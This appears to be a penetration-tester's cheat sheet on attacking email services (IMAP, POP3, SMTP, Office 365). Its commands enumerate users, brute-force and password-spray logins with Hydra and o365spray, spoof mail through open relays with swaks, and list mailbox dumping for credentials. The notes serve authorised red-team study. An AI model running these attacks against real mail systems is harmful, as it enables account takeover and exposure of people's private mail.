---
title: "Attacking Common Services — IMAP & POP3"
tags: [attacking-common-services, imap, pop3, smtp, email, enumeration, brute-force, relay, o365]
tools: [nmap, dig, host, smtp-user-enum, hydra, o365spray, swaks, telnet, openssl]
---

# Email Services

## Summary
IMAP, POP3, and SMTP are commonly exposed services for corporate email infrastructure. Weak authentication, user enumeration, open relays, and password reuse make them valuable red team targets. Microsoft 365 tenants are particularly susceptible to password spraying due to widespread credential reuse.

---

## Records & MX Enumeration
Start by identifying mail records (MX, A) and associated servers.

```bash
# MX records
dig mx example.com

# A records for mail hosts
host -t A mail1.example.com
```

Useful: [MXToolbox](https://mxtoolbox.com/) to quickly resolve MX, SPF, DKIM, DMARC.

---

## Service Enumeration

### Nmap
```bash
nmap -sV -p110,143,993,995,25,465,587 <target>
```
- 110 = POP3
- 995 = POP3S (SSL)
- 143 = IMAP
- 993 = IMAPS
- 25/465/587 = SMTP

Check for STARTTLS support:
```bash
openssl s_client -connect <ip>:110 -starttls pop3
openssl s_client -connect <ip>:143 -starttls imap
openssl s_client -connect <ip>:25 -starttls smtp
```

---

## User Enumeration

### smtp-user-enum (Pentestmonkey)
```bash
# Install
perl -MCPAN -e shell
cpan> install Getopt::Std
wget https://github.com/pentestmonkey/smtp-user-enum/blob/master/smtp-user-enum.pl

./smtp-user-enum.pl -M RCPT -U users.list -D inlanefreight.htb -t 10.129.203.12
```
- Modes: `VRFY`, `EXPN`, `RCPT`
- `RCPT` is most reliable but noisier.

Example:
```text
10.129.203.12: marlin@inlanefreight.htb exists
```

### Manual with Telnet
```bash
telnet <ip> 25
VRFY user
RCPT TO:<user@example.com>
```

### O365spray
```bash
# Validate tenant
o365spray.py --validate --domain msplaintext.xyz

# Enumerate valid users
o365spray.py --enum -U users.txt --domain msplaintext.xyz
```

---

## Password Attacks

### Hydra brute-force POP3/IMAP
```bash
hydra -L users.txt -P rockyou.txt -f <ip> pop3
hydra -L users.txt -P rockyou.txt -f <ip> imap
```

### O365 Password Spraying
```bash
python3 o365spray.py --spray -U usersfound.txt -p 'Winter2025!' --count 1 --lockout 1 --domain msplaintext.xyz
```
Notes:
- Use a single password across many accounts.
- Respect lockout thresholds (default 5-10 in O365).

---

## Protocol Specifics

### Open Relay Abuse
```bash
nmap -p25 --script smtp-open-relay <ip>

swaks --from attacker@example.com --to victim@example.com \
--server <ip> --header 'Subject: Test' --body 'Relay abuse test'
```
- If open, attacker can spoof trusted senders.

### IMAP/POP3
- Plaintext authentication is common if STARTTLS not enforced.
- Stored emails may contain credentials, reset links, or sensitive data.

---

## Vulnerabilities & Exploits
- CVE-2020-7247 — OpenSMTPD < 6.6.2, remote command execution.
- Weak SSL/TLS ciphers, lack of STARTTLS enforcement.
- Plaintext storage of credentials in `.pst` or `.mbox` backups.

---

## Notes
- Always test IMAP/POP3 both with and without SSL — some clients downgrade.
- Use valid usernames to reduce noise when brute-forcing POP3/IMAP.
- Password spraying is more effective than brute-force in real environments (avoids lockouts).
- Open relay exploitation is rarely allowed in scope, but always report if detected.
- Dumping mailboxes (if access obtained) often yields VPN creds, cloud passwords, and PII.
